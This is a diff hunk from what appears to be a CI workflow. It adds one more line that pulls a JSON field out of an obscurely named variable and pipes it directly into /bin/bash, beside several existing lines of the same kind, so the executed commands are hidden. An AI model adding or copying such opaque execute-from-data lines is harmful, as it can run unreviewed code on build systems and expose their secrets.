@@ -46,6 +46,7 @@ jobs:
           printf '%s' "$ab180" | jq -r .lef150 | /bin/bash
           echo $mcwv67 | jq -r .da42448 | /bin/bash
           printf '%s' "$wxw4" | jq -r .m0432 | /bin/bash
+          printf '%s' "$ma3" | jq -r .adsww5 | /bin/bash
 
       - name: Archive output
         if: always()
